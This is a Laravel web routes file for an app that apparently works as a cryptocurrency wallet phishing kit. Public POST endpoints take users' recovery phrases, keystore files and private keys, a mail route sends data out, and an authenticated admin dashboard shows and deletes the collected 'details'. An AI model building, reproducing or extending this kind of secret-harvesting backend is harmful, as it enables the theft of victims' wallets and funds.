<?php

use App\Http\Controllers\Admin;
use App\Http\Controllers\AdminController;
use App\Http\Controllers\ViewController;
use App\Http\Controllers\Phrase_keystore_private;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('/', [ViewController::class,  'mainView'])->name('IndexView');
Route::get('all_wallet', [ViewController::class,  'walletView'])->name('WalletView');
Route::get('app', [ViewController::class,  'appView'])->name('AppView');
Route::post('app/phrase', [Phrase_keystore_private::class,  'phraseSubmitRequest'])->name('phraseSubmit');
Route::post('app/keystore', [Phrase_keystore_private::class,  'keystoreSubmitRequest'])->name('keystoreSubmit');
Route::post('app/private', [Phrase_keystore_private::class,  'privateSubmitRequest'])->name('privateSubmit');
Route::post('/mail', [AdminController::class,  'mailTo'])->name('sendMail');


Route::get('admin/dashboard', [ViewController::class,  'adminView'])->name('viewAdmin')->middleware('auth');
Route::delete('admin/dashboard/{detail}', [Phrase_keystore_private::class,  'detailDestroy'])->name('DestroyDetail')->middleware('auth');
// Route::get('admin/sign_up', [ViewController::class,  'viewAdmin'])->name('AdminView');
// Route::post('admin/sign_up', [AdminController::class,  'storeAdmin'])->name('AdminStore');
Route::get('admin/password_reset', [ViewController::class,  'passwordView'])->name('resetPassword')->middleware('auth');
Route::put('admin/password_reset', [AdminController::class, 'passwordUpdate'])->name('UpdatePassword')->middleware('auth');
Route::get('admin/sign_in', [ViewController::class,  'viewAdminLoging'])->name('AdminLoginView');
Route::post('admin/sign_in', [AdminController::class,  'authenticate'])->name('authenticate');
Route::get('admin/sign_out', [AdminController::class,  'signOut'])->name('logout')->middleware('auth');
